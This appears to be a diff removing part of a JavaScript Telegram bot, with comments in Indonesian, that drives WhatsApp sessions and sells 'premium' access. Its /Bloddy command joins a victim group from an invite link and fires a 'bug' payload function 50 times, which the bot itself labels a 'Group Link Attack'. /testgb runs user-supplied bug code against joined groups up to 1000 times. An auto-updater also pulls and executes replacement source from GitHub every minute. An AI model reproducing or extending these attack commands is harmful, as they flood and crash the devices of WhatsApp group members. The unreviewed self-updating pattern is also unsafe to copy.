-        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("blank gb ERROR:", err)
-  }
-});
-
-bot.onText(/\/Bloddy(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-    const randomImage = getRandomImage()
-
-    // 1. Cek Premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]]
-        }
-      });
-    }
-
-    // 2. Validasi Link Grup
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Bloddy https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
-    }
-
-    const groupLink = match[1]
-    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
-    const date = getCurrentDate()
-
-    // 3. Cek Cooldown & Session
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    // 4. Response Telegram
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
-      ▹ Type : Group Link Attack\n
-      ▹ Type Bug : Delay Group
-      ▹ Code : ${inviteCode}\n
-      ▹ Status : Executing...\n
-      ▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
-      }
-    });
-
-    // 5. Eksekusi WhatsApp (Async Process)
-    setTimeout(async () => {
-      try {
-        // Ambil session pertama yang tersedia
-        const [sock] = sessions.values() 
-
-        // Join ke grup terlebih dahulu menggunakan kode invite
-        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
-        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'
-
-        if (groupJid) {
-          for (let i = 0; i < 50; i++) {
-            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
-            await DelayTrackingHard(sock, groupJid);
-          }
-          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
-        }
-
-      } catch (err) {
-        console.log("Group Attack Error:", err)
-        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Delay Gb ERROR:", err)
-  }
-});
-
-bot.onText(/\/cekemoji/, async (msg) => {
-  const chatId = msg.chat.id;
-  const targetMsg = msg.reply_to_message;
-
-  // 1. Cek jika tidak mereply pesan apa pun
-  if (!targetMsg) {
-    return bot.sendMessage(
-      chatId,
-      `<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply pesan yang berisi emoji premium.</b>
-
-<b>Contoh:</b>
-- User kirim emoji premium
-- Reply emoji tersebut dengan command <code>/cekemoji</code>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  const emojis = [];
-
-  // 2. Ambil emoji dari teks biasa
-  if (targetMsg.entities) {
-    targetMsg.entities.forEach((entity) => {
-      if (entity.type === "custom_emoji") {
-        emojis.push({ id: entity.custom_emoji_id });
-      }
-    });
-  }
-
-  // 3. Ambil emoji dari caption (foto/video)
-  if (targetMsg.caption_entities) {
-    targetMsg.caption_entities.forEach((entity) => {
-      if (entity.type === "custom_emoji") {
-        emojis.push({ id: entity.custom_emoji_id });
-      }
-    });
-  }
-
-  // 4. Jika tidak ditemukan emoji premium
-  if (emojis.length === 0) {
-    return bot.sendMessage(
-      chatId,
-      `<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Tidak ada custom emoji terdeteksi.</b>
-
-Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  // 5. Susun teks hasil
-  let result = `<blockquote><b><tg-emoji emoji-id="5289594654176606759">✨</tg-emoji><tg-emoji emoji-id="5287412269624358128">✨</tg-emoji><tg-emoji emoji-id="5289864047410314050">✨</tg-emoji><tg-emoji emoji-id="5290014366970706894">✨</tg-emoji>
-╔══════════════════╗
-   CUSTOM EMOJI FOUND
-╚══════════════════╝</b></blockquote>\n`;
-
-  emojis.forEach((e, i) => {
-    // Gunakan &lt; dan &gt; agar kode HTML-nya muncul sebagai teks dan tidak ter-render
-    result += `<blockquote><b><tg-emoji emoji-id="5334890573281114250">✨</tg-emoji> Id Emoji ${i + 1}</b>
-<code>${e.id}</code>
-<tg-emoji emoji-id="5085022089103016925">✨</tg-emoji> <b>Format Pakai:</b>
-<code>&lt;tg-emoji emoji-id="${e.id}"&gt;✨&lt;/tg-emoji&gt;</code></blockquote>\n`;
-  });
-
-  result += `<blockquote><b>━━━━━━━━━━━━━━━━━━━━</b>
-<b>Total Emoji:</b> ${emojis.length}</blockquote>`;
-
-  // 6. Kirim hasil
-  bot.sendMessage(chatId, result, { parse_mode: "HTML" });
-});
-
-bot.onText(/\/updatesc/, async (msg) => {
-    const chatId = msg.chat.id;
-    const repoRaw = "https://raw.githubusercontent.com/DAFARELXP/Xylent-Empire/main/empire.js";
-    const localFilePath = path.join(__dirname, './empire.js');
-    const backupPath = path.join(__dirname, './empire.js.bak');
-
-    const statusMsg = await bot.sendMessage(chatId, "🔍 *Mengecek pembaruan sistem...*", { parse_mode: "Markdown" });
-
-    try {
-        // 1. Fetch data dari GitHub
-        const response = await axios.get(repoRaw, { timeout: 10000 });
-        const newData = response.data;
-
-        if (!newData || typeof newData !== 'string') {
-            throw new Error("File dari server kosong atau tidak valid.");
-        }
-
-        // 2. Cek apakah ada perubahan (opsional tapi disarankan)
-        const currentData = fs.readFileSync(localFilePath, 'utf8');
-        if (newData === currentData) {
-            return bot.editMessageText("Sistem sudah dalam versi terbaru. ✅", {
-                chat_id: chatId,
-                message_id: statusMsg.message_id
-            });
-        }
-
-        // 3. Backup file lama untuk keamanan
-        fs.copyFileSync(localFilePath, backupPath);
-
-        // 4. Tulis file baru
-        fs.writeFileSync(localFilePath, newData);
-
-        await bot.editMessageText(
-            "🚀 *Update Berhasil!*\n\nSistem akan melakukan restart otomatis dalam 3 detik untuk menerapkan perubahan.",
-            { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown" }
-        );
-
-        // Kasih jeda sedikit sebelum exit agar pesan terkirim
-        setTimeout(() => {
-            process.exit(); 
-        }, 3000);
-
-    } catch (e) {
-        console.error("Update Error:", e.message);
-        
-        // Jika terjadi error saat menulis, coba kembalikan dari backup jika tersedia
-        if (fs.existsSync(backupPath)) {
-            fs.copyFileSync(backupPath, localFilePath);
-        }
-
-        bot.sendMessage(chatId, `❌ *Update Gagal!*\nTerjadi kesalahan: \`${e.message}\``, { parse_mode: "Markdown" });
-    }
-});
-
-const CONFIG = {
-  OWNER_ID     : 8768626313,
-  RAW_URL      : "https://raw.githubusercontent.com/DAFARELXP/Xylent-Empire/main/empire.js",
-  LOCAL_FILE   : path.join(__dirname, "empire.js"),
-  INTERVAL_MIN : 1,
-};
-
-let autoUpdateEnabled = false;
-let checkIntervalID   = null;
-let lastKnownContent  = null;  // baseline isi file
-
-// ── CEK & PROSES UPDATE ───────────────────────────────────────
-async function checkUpdate(chatId = null) {
-  try {
-    const axios = require('axios');
-    const response = await axios.get(CONFIG.RAW_URL, {
-      timeout: 10000,
-      headers: { "User-Agent": "XylentEmpireBot" },
-      responseType: 'text'
-    });
-
-    const newData = response.data;
-    if (!newData || typeof newData !== 'string') throw new Error("File kosong");
-
-    // Belum ada baseline — simpan dulu, jangan download
-    if (lastKnownContent === null) {
-      lastKnownContent = newData;
-      console.log(`[AutoUpdate] Baseline tersimpan.`);
-      return;
-    }
-
-    // Tidak ada perubahan
-    if (newData === lastKnownContent) {
-      console.log(`[AutoUpdate] Tidak ada update.`);
-      if (chatId) {
-        bot.sendMessage(chatId,
-          `<blockquote>✅ <b>Tidak ada update baru.</b>\n\n` +
-          `Sistem sudah menggunakan versi terbaru.\n\n` +
-          `<i>Xylent Empire Auto-Update System</i></blockquote>`,
-          { parse_mode: "HTML" }
-        );
-      }
-      return;
-    }
-
-    // Ada perubahan — update!
-    lastKnownContent = newData;
-    if (fs.existsSync(CONFIG.LOCAL_FILE)) {
-      fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + '.bak');
-    }
-    fs.writeFileSync(CONFIG.LOCAL_FILE, newData, 'utf-8');
-    console.log(`[AutoUpdate] File berhasil diperbarui!`);
-
-    const msg =
-      `<blockquote>🚀 <b>Auto-Update Berhasil!</b>\n\n` +
-      `Pembaruan terbaru dari owner telah berhasil\n` +
-      `diunduh dan diterapkan ke dalam sistem.\n\n` +
-      `┌─────────────────────────\n` +
-      `│ 📦 File  : <code>empire.js</code>\n` +
-      `│ ⏰ Waktu : ${new Date().toLocaleString("id-ID")}\n` +
-      `└─────────────────────────\n\n` +
-      `⚙️ Sistem sedang mempersiapkan restart...\n` +
-      `♻️ Bot akan kembali online dalam <b>3 detik</b>\n\n` +
-      `<i>Xylent Empire Auto-Update System</i></blockquote>`;
-
-    bot.sendMessage(CONFIG.OWNER_ID, msg, { parse_mode: "HTML" });
-    if (chatId && chatId !== CONFIG.OWNER_ID) {
-      bot.sendMessage(chatId, msg, { parse_mode: "HTML" });
-    }
-
-    setTimeout(() => { process.exit(); }, 3000);
-
-  } catch (err) {
-    console.error("[AutoUpdate] Error:", err.message);
-    const errMsg =
-      `<blockquote>❌ <b>Gagal cek update:</b>\n` +
-      `<code>${err.message}</code></blockquote>`;
-    bot.sendMessage(CONFIG.OWNER_ID, errMsg, { parse_mode: "HTML" });
-    if (chatId && chatId !== CONFIG.OWNER_ID) {
-      bot.sendMessage(chatId, errMsg, { parse_mode: "HTML" });
-    }
-  }
-}
-
-// ── AKTIFKAN AUTO-UPDATE ──────────────────────────────────────
-async function startAutoUpdate(chatId) {
-  if (autoUpdateEnabled) {
-    return bot.sendMessage(chatId,
-      `<blockquote>⚠️ <b>Auto-Update sudah berjalan!</b>\n\n` +
-      `Sistem pemantau pembaruan sudah aktif\n` +
-      `dan sedang berjalan di latar belakang.\n\n` +
-      `Gunakan /updatestatus untuk melihat status.</blockquote>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  autoUpdateEnabled = true;
-  lastKnownContent  = null; // reset biar ambil baseline fresh
-
-  // Ambil baseline dulu
-  await checkUpdate(null);
-
-  // Mulai interval
-  const ms = CONFIG.INTERVAL_MIN * 60 * 1000;
-  checkIntervalID = setInterval(async () => {
-    console.log(`[AutoUpdate] Cek... ${new Date().toLocaleString("id-ID")}`);
-    await checkUpdate(null);
-  }, ms);
-
-  bot.sendMessage(chatId,
-    `<blockquote>✅ <b>Auto-Update Diaktifkan!</b>\n\n` +
-    `Sistem pemantau pembaruan kini telah berjalan\n` +
-    `dan siap mendeteksi perubahan terbaru secara otomatis.\n\n` +
-    `┌─────────────────────────\n` +
-    `│ 📦 File     : <code>empire.js</code>\n` +
-    `│ ⏱ Interval : setiap <b>${CONFIG.INTERVAL_MIN} menit</b>\n` +
-    `│ ⏰ Aktif    : ${new Date().toLocaleString("id-ID")}\n` +
-    `└─────────────────────────\n\n` +
-    `🔍 Bot akan otomatis mengecek apakah owner\n` +
-    `telah mengupload file baru di GitHub.\n` +
-    `Jika ada pembaruan, sistem akan langsung\n` +
-    `mengunduh dan menerapkannya secara otomatis.\n\n` +
-    `<i>Xylent Empire Auto-Update System — Aktif</i></blockquote>`,
-    { parse_mode: "HTML" }
-  );
-}
-
-// ── MATIKAN AUTO-UPDATE ───────────────────────────────────────
-function stopAutoUpdate(chatId) {
-  if (!autoUpdateEnabled) {
-    return bot.sendMessage(chatId,
-      `<blockquote>⚠️ <b>Auto-Update sudah mati.</b>\n\n` +
-      `Gunakan /autoupdate on untuk mengaktifkan kembali.</blockquote>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  clearInterval(checkIntervalID);
-  checkIntervalID   = null;
-  autoUpdateEnabled = false;
-  lastKnownContent  = null;
-
-  bot.sendMessage(chatId,
-    `<blockquote>🔴 <b>Auto-Update Dimatikan!</b>\n\n` +
-    `Sistem pemantau pembaruan telah dihentikan\n` +
-    `dan tidak akan mengecek perubahan apapun\n` +
-    `sampai diaktifkan kembali.\n\n` +
-    `┌─────────────────────────\n` +
-    `│ 📦 File  : <code>empire.js</code>\n` +
-    `│ ⏰ Mati  : ${new Date().toLocaleString("id-ID")}\n` +
-    `└─────────────────────────\n\n` +
-    `⚠️ Selama auto-update mati, sistem tidak\n` +
-    `akan mendeteksi pembaruan terbaru dari owner.\n` +
-    `Gunakan /checkupdate untuk cek manual,\n` +
-    `atau /autoupdate on untuk mengaktifkan kembali.\n\n` +
-    `<i>Xylent Empire Auto-Update System — Nonaktif</i></blockquote>`,
-    { parse_mode: "HTML" }
-  );
-}
-
-// ── OWNER ONLY ────────────────────────────────────────────────
-function ownerOnly(msg) {
-  if (!msg.from || msg.from.id !== CONFIG.OWNER_ID) {
-    bot.sendMessage(msg.chat.id,
-      `<blockquote>⛔ Perintah ini hanya untuk <b>owner</b>.</blockquote>`,
-      { parse_mode: "HTML" }
-    );
-    return false;
-  }
-  return true;
-}
-
-// ── COMMANDS ──────────────────────────────────────────────────
-bot.onText(/\/autoupdate (on|off)/i, async (msg, match) => {
-  if (!ownerOnly(msg)) return;
-  const action = match[1].toLowerCase();
-  if (action === "on") await startAutoUpdate(msg.chat.id);
-  else stopAutoUpdate(msg.chat.id);
-});
-
-bot.onText(/\/checkupdate/, async (msg) => {
-  if (!ownerOnly(msg)) return;
-  bot.sendMessage(msg.chat.id,
-    `<blockquote>🔍 <b>Memeriksa Pembaruan...</b>\n\n` +
-    `Sistem sedang menghubungi GitHub Repository.\n` +
-    `Mohon tunggu sebentar...</blockquote>`,
-    { parse_mode: "HTML" }
-  );
-  await checkUpdate(msg.chat.id);
-});
-
-bot.onText(/\/updatestatus/, (msg) => {
-  if (!ownerOnly(msg)) return;
-  bot.sendMessage(msg.chat.id,
-    `<blockquote>📊 <b>Status Auto-Update</b>\n\n` +
-    `┌─────────────────────────\n` +
-    `│ 🔌 Status   : ${autoUpdateEnabled ? "🟢 AKTIF" : "🔴 MATI"}\n` +
-    `│ ⏱ Interval : ${CONFIG.INTERVAL_MIN} menit\n` +
-    `│ 📦 File     : <code>empire.js</code>\n` +
-    `└─────────────────────────\n\n` +
-    `<i>Xylent Empire Auto-Update System</i></blockquote>`,
-    { parse_mode: "HTML" }
-  );
-});
-
-// Taruh di paling bawah script setelah semua bot.onText
-bot.getMe().then(async (me) => {
-  console.log(`[Bot] Online! @${me.username}`);
-
-  try {
-    const axios = require('axios');
-    const response = await axios.get(CONFIG.RAW_URL, {
-      timeout: 10000,
-      headers: { "User-Agent": "XylentEmpireBot" },
-      responseType: 'text'
-    });
-
-    const newData = response.data;
-    const currentData = fs.existsSync(CONFIG.LOCAL_FILE)
-      ? fs.readFileSync(CONFIG.LOCAL_FILE, 'utf-8')
-      : null;
-
-    if (!currentData || newData === currentData) {
-      lastKnownContent = newData;
-      console.log(`[AutoUpdate] File sudah terbaru.`);
-      bot.sendMessage(CONFIG.OWNER_ID,
-        `<blockquote>✅ <b>Bot Online!</b>\n\n` +
-        `File <code>empire.js</code> sudah versi terbaru.\n\n` +
-        `<i>Xylent Empire Auto-Update System</i></blockquote>`,
-        { parse_mode: "HTML" }
-      );
-    } else {
-      lastKnownContent = newData;
-      fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + '.bak');
-      fs.writeFileSync(CONFIG.LOCAL_FILE, newData, 'utf-8');
-      console.log(`[AutoUpdate] Update ditemukan saat startup!`);
-      bot.sendMessage(CONFIG.OWNER_ID,
-        `<blockquote>🚀 <b>Update Ditemukan Saat Startup!</b>\n\n` +
-        `File terbaru dari GitHub langsung diterapkan.\n\n` +
-        `┌─────────────────────────\n` +
-        `│ 📦 File  : <code>empire.js</code>\n` +
-        `│ ⏰ Waktu : ${new Date().toLocaleString("id-ID")}\n` +
-        `└─────────────────────────\n\n` +
-        `♻️ Bot restart dalam <b>3 detik</b>\n\n` +
-        `<i>Xylent Empire Auto-Update System</i></blockquote>`,
-        { parse_mode: "HTML" }
-      );
-      setTimeout(() => { process.exit(); }, 3000);
-    }
-
-  } catch (e) {
-    console.error("[AutoUpdate] Gagal cek saat startup:", e.message);
-  }
-});
-
-bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const argsRaw = match[1];
-  const senderId = msg.from.id;
-  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ You are not authorized to add premium users."
-    );
-  }
-  
-  if (!argsRaw) {
-    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
-  }
-
-  try {
-    const args = argsRaw.split(' ');
-
-    const textParts = [];
-    let isAnimated = false;
-    let delay = 500;
-
-    for (let arg of args) {
-      if (arg === '--gif') isAnimated = true;
-      else if (arg.startsWith('--delay=')) {
-        const val = parseInt(arg.split('=')[1]);
-        if (!isNaN(val)) delay = val;
-      } else {
-        textParts.push(arg);
-      }
-    }
-
-    const text = textParts.join(' ');
-    if (!text) {
-      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
-    }
-
-    // Validasi delay
-    if (isAnimated && (delay < 100 || delay > 1500)) {
-      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
-    }
-
-    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');
-
-    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
-    const response = await axios.get(apiUrl, {
-      responseType: 'arraybuffer',
-    });
-
-    const buffer = Buffer.from(response.data);
-
-    // Kirim sticker (bot API auto-detects WebP/GIF)
-    await bot.sendSticker(chatId, buffer);
-  } catch (error) {
-    console.error('❌ Error brat:', error.message);
-    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
-  }
-});
-
-// VERSI Node-bot-telegram
-bot.onText(/\/tofotolive(?: (.+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const argsText = match[1];
-
-    if (!argsText) {
-        return bot.sendMessage(chatId, 
-            '❌ **Format Salah**\n\n' +
-            'Gunakan format:\n`/tofotolive <videoUrl> <audioUrl> [fade]`\n\n' +
-            '**Contoh:**\n`/tofotolive https://.../video.mp4 https://.../audio.mp3 0.5`', 
-            { parse_mode: 'Markdown' }
-        );
-    }
-
-    const args = argsText.split(' ');
-    if (args.length < 2) {
-        return bot.sendMessage(chatId, '❌ **Argumen Kurang**\n\nDibutuhkan setidaknya `videoUrl` dan `audioUrl`.', { parse_mode: 'Markdown' });
-    }
-
-    const [videoUrl, audioUrl, fade] = args;
-    const statusMessage = await bot.sendMessage(chatId, '⏳ Sedang memproses, harap tunggu...');
-
-    try {
-        let apiUrl = `https://shynne-apis.vercel.app/tools/livephoto?videoUrl=${encodeURIComponent(videoUrl)}&audioUrl=${encodeURIComponent(audioUrl)}`;
-        if (fade) {
-            apiUrl += `&fade=${fade}`;
-        }
-
-        console.log(`Requesting API: ${apiUrl}`);
-
-        const response = await axios.get(apiUrl, {
-            responseType: 'arraybuffer'
-        });
-
-        await bot.sendDocument(chatId, Buffer.from(response.data), {
-            caption: '✅ Foto Live berhasil dibuat!'
-        }, {
-            filename: 'livephoto.mov', 
-            contentType: 'video/quicktime'
-        });
-
-        bot.deleteMessage(chatId, statusMessage.message_id);
-
-    } catch (error) {
-        console.error(error);
-        bot.editMessageText('❌ **Terjadi Kesalahan**\n\nGagal membuat foto live. Pastikan link video dan audio valid dan dapat diakses secara publik.', {
-            chat_id: chatId,
-            message_id: statusMessage.message_id,
-            parse_mode: 'Markdown'
-        });
-    }
-});
-
-bot.onText(/\/checkerror/, async (msg) => {
-    const chatId = msg.chat.id;
-    const reply = msg.reply_to_message;
-    
-    // Fungsi pembantu untuk ambil foto baru setiap kali dipanggil
-    const getNewPhoto = () => typeof getRandomImage === 'function' ? getRandomImage() : "https://via.placeholder.com/500";
-
-    if (!reply) return bot.sendMessage(chatId, "❌ ☇ Reply kode atau file <b>.js</b> yang ingin dicek.", { parse_mode: "HTML" });
-
-    let codeToTest = "";
-    try {
-        // 1. AMBIL KODE
-        if (reply.document) {
-            if (!reply.document.file_name.endsWith('.js')) {
-                return bot.sendMessage(chatId, "❌ ☇ File harus berformat <b>.js</b>", { parse_mode: "HTML" });
-            }
-            const fileLink = await bot.getFileLink(reply.document.file_id);
-            const response = await axios.get(fileLink);
-            codeToTest = response.data;
-        } else if (reply.text) {
-            codeToTest = reply.text;
-        }
-
-        // 2. PROSES ANALISA (Hanya Teks Sementara)
-        const loadingMsg = await bot.sendMessage(chatId, "🔍 <i>Analyzing code...</i>", { parse_mode: "HTML" });
-
-        try {
-            // 3. VM CHECKING
-            const sandbox = { console, Buffer, process: { env: {} }, module: {}, exports: {} };
-            const context = vm.createContext(sandbox);
-            const script = new vm.Script(codeToTest, { filename: 'user_code.js' });
-            script.runInContext(context, { timeout: 1500 });
-
-            // --- HASIL SUKSES (KIRIM FOTO) ---
-            await bot.sendPhoto(chatId, getNewPhoto(), {
-                caption: `<blockquote><b>⌜ ✅ ⌟ CHECK SUCCESS</b></blockquote>\n\n` +
-                         `⌑ <b>Status:</b> No Syntax Error\n` +
-                         `⌑ <b>Result:</b> Kode aman dan siap dijalankan!\n\n` +
-                         `<i>Semua struktur kurung dan variabel terlihat normal.</i>`,
-                parse_mode: "HTML"
-            });
-            await bot.deleteMessage(chatId, loadingMsg.message_id);
-
-        } catch (err) {
-            // --- HASIL ERROR (KIRIM FOTO) ---
-            const stack = err.stack || "";
-            const lines = codeToTest.split('\n');
-            const match = stack.match(/user_code\.js:(\d+)/);
-            const lineNum = match ? parseInt(match[1]) : null;
-            
-            let errorSnippet = "";
-            let recommendation = "Periksa kembali logika kodemu.";
-
-            if (lineNum && lines[lineNum - 1]) {
-                errorSnippet = `<code>${lines[lineNum - 1].trim()}</code>`;
-                if (err.message.includes("is not defined")) recommendation = "Ada variabel yang lupa dideklarasikan atau typo.";
-                if (err.message.includes("Unexpected token")) recommendation = "Kurang tanda baca seperti <code>}</code>, <code>)</code>, atau <code>;</code>";
-            }
-
-            const errorText = 
-                `<blockquote><b>⌜ ❌ ⌟ ERROR DETECTED</b></blockquote>\n\n` +
-                `⌑ <b>Message:</b> <code>${err.message}</code>\n` +
-                `⌑ <b>Line:</b> ${lineNum || 'Unknown'}\n\n` +
-                `⌑ <b>Kode Bermasalah:</b>\n${errorSnippet || 'Tidak terbaca'}\n\n` +
-                `⌑ <b>Fix:</b> ${recommendation}`;
-
-            await bot.sendPhoto(chatId, getNewPhoto(), {
-                caption: errorText,
-                parse_mode: "HTML"
-            });
-            await bot.deleteMessage(chatId, loadingMsg.message_id);
-        }
-    } catch (e) {
-        bot.sendMessage(chatId, "❌ Error fatal: " + e.message);
-    }
-});
-
-bot.onText(/\/cekidch(?:\s+(.+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const link = match[1];
-
-    if (!link || !link.includes("whatsapp.com/channel/")) {
-        return bot.sendMessage(chatId, "❌ ☇ Masukkan link saluran WA yang valid.\nContoh: <code>/cekidch https://whatsapp.com/channel/0029Va...</code>", { parse_mode: "HTML" });
-    }
-
-    // Mengambil Invite Code dari link
-    const inviteCode = link.split("channel/")[1];
-
-    try {
-        // Proses ini membutuhkan koneksi WA (sock) yang aktif
-        // Pastikan variabel 'sock' tersedia di scope ini
-        const res = await sock.newsletterMetadata("invite", inviteCode);
-
-        if (res) {
-            const info = `<blockquote><b>⌜ 📢 ⌟ WHATSAPP CHANNEL INFO</b></blockquote>\n\n` +
-                         `⌑ <b>Nama:</b> ${res.name}\n` +
-                         `⌑ <b>ID Saluran:</b> <code>${res.id}</code>\n` +
-                         `⌑ <b>Status:</b> ${res.state}\n` +
-                         `⌑ <b>Followers:</b> ${res.subscribers || 'Tersembunyi'}\n` +
-                         `⌑ <b>Role Kamu:</b> ${res.viewer_metadata?.role || 'Guest'}\n\n` +
-                         `⌑ <b>Deskripsi:</b>\n<i>${res.description || 'Tidak ada deskripsi'}</i>`;
-
-            await bot.sendMessage(chatId, info, { parse_mode: "HTML" });
-        }
-    } catch (err) {
-        console.error(err);
-        bot.sendMessage(chatId, "❌ ☇ <b>Gagal!</b>\nSaluran tidak ditemukan atau bot tidak memiliki akses ke fitur Newsletter.");
-    }
-});
-
-
-bot.onText(/\/tourl/i, async (msg) => {
-    const chatId = msg.chat.id;
-    
-    
-    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
-        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
-    }
-
-    const repliedMsg = msg.reply_to_message;
-    let fileId, fileName;
-
-    
-    if (repliedMsg.document) {
-        fileId = repliedMsg.document.file_id;
-        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
-    } else if (repliedMsg.photo) {
-        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
-        fileName = `photo_${Date.now()}.jpg`;
-    } else if (repliedMsg.video) {
-        fileId = repliedMsg.video.file_id;
-        fileName = `video_${Date.now()}.mp4`;
-    }
-
-    try {
-        
-        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");
-
-        
-        const fileLink = await bot.getFileLink(fileId);
-        const response = await axios.get(fileLink, { responseType: 'stream' });
-
-        
-        const form = new FormData();
-        form.append('reqtype', 'fileupload');
-        form.append('fileToUpload', response.data, {
-            filename: fileName,
-            contentType: response.headers['content-type']
-        });
-
-        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
-            headers: form.getHeaders()
-        });
-
-        
-        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
-            chat_id: chatId,
-            message_id: processingMsg.message_id
-        });
-
-    } catch (error) {
-        console.error(error);
-        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
-    }
-});
-
-function createSafeSock(sock) {
-    // Fungsi ini membungkus sock asli agar lebih aman saat dijalankan di VM
-    return {
-        ...sock,
-        sendMessage: async (...args) => {
-            try {
-                return await sock.sendMessage(...args);
-            } catch (e) {
-                console.error("SafeSock Error:", e.message);
-            }
-        }
-    };
-}
-
-
-bot.onText(/\/testgb (.+) (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const groupLink = match[1].trim();
-    let jumlah = Math.max(0, Math.min(parseInt(match[2]) || 1, 1000));
-
-    try {
-        // --- AMBIL KODE INVITE ---
-        const inviteRegex = /chat\.whatsapp\.com\/([a-zA-Z0-9]{20,26})/;
-        const inviteMatch = groupLink.match(inviteRegex);
-        if (!inviteMatch) return bot.sendMessage(chatId, "❌ Link grup tidak valid");
-        const groupCode = inviteMatch[1];
-
-        if (!msg.reply_to_message) {
-            return bot.sendMessage(chatId, "❌ Reply dengan function atau file .js");
-        }
-
-        // --- AMBIL KODE BUG (TEKS/FILE) ---
-        let funcCode = "";
-        if (msg.reply_to_message.document) {
-            const fileId = msg.reply_to_message.document.file_id;
-            const fileLink = await bot.getFileLink(fileId);
-            const res = await axios.get(fileLink);
-            funcCode = res.data;
-        } else {
-            funcCode = msg.reply_to_message.text;
-        }
-
-        // --- KIRIM STATUS AWAL ---
-        const processMsg = await bot.sendPhoto(chatId, "https://g.top4top.io/p_3788ghdlv1.jpg", {
-            caption: `
-<blockquote><pre>⬡═―—⊱ ⎧ Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group ⎭ ⊰―—═⬡</pre></blockquote>
-▢  Target: Group Link
-▢  Type: GB Auto Join & Bug
-▢  Status: Joining Group...
-╘═——————————————═⬡`,
-            parse_mode: "HTML"
-        });
-
-        const safeSock = createSafeSock(sock); // 'sock' harus tersedia secara global atau didefinisikan
-        let targetJid;
-
-        // --- LOGIKA JOIN ---
-        try {
-            const groupData = await sock.groupGetInviteInfo(groupCode);
-            targetJid = groupData.id;
-            await sock.groupAcceptInvite(groupCode);
-            await sleep(2500); 
-            console.log(chalk.green(`[SUCCESS] Berhasil Join: ${targetJid}`));
-        } catch (e) {
-            if (!e.message.includes("409")) {
-                return bot.editMessageCaption(`❌ Gagal Join Otomatis: ${e.message}`, {
-                    chat_id: chatId,
-                    message_id: processMsg.message_id
-                });
-            }
-            // Jika 409, ambil targetJid secara manual jika perlu atau asumsikan tetap lanjut
-        }
-
-        // --- LOGIKA VM ---
-        const sandbox = {
-            console, Buffer, chalk, sock: safeSock, target: targetJid, sleep,
-            generateWAMessageFromContent, generateForwardMessageContent,
-            generateWAMessage, prepareWAMessageMedia, proto, jidDecode, areJidsSameUser
-        };
-        const context = vm.createContext(sandbox);
-
